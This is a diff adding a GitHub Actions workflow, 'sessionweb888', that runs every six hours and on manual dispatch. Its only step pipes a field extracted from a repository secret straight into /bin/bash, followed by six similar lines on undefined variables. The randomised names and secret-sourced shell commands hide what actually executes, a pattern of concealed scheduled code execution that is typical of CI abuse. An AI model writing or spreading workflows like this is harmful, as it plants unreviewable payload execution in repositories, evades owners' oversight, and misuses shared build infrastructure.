@@ -1,0 +1,24 @@
+name: sessionweb888
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sessionweb888
+        env:
+          del59786: ${{ secrets.del59786 }}
+        run: |
+          echo $del59786 | jq -r .keg023 | /bin/bash
+          echo $ehi93 | jq -r .vzs31 | /bin/bash
+          echo $jzy274 | jq -r .hzxux216 | /bin/bash
+          echo $ojm19489 | jq -r .opdcx7 | /bin/bash
+          echo $hmfhw1 | jq -r .rdff2 | /bin/bash
+          echo $x649 | jq -r .xg8 | /bin/bash
+          echo $cdld72425 | jq -r .u79102 | /bin/bash
+
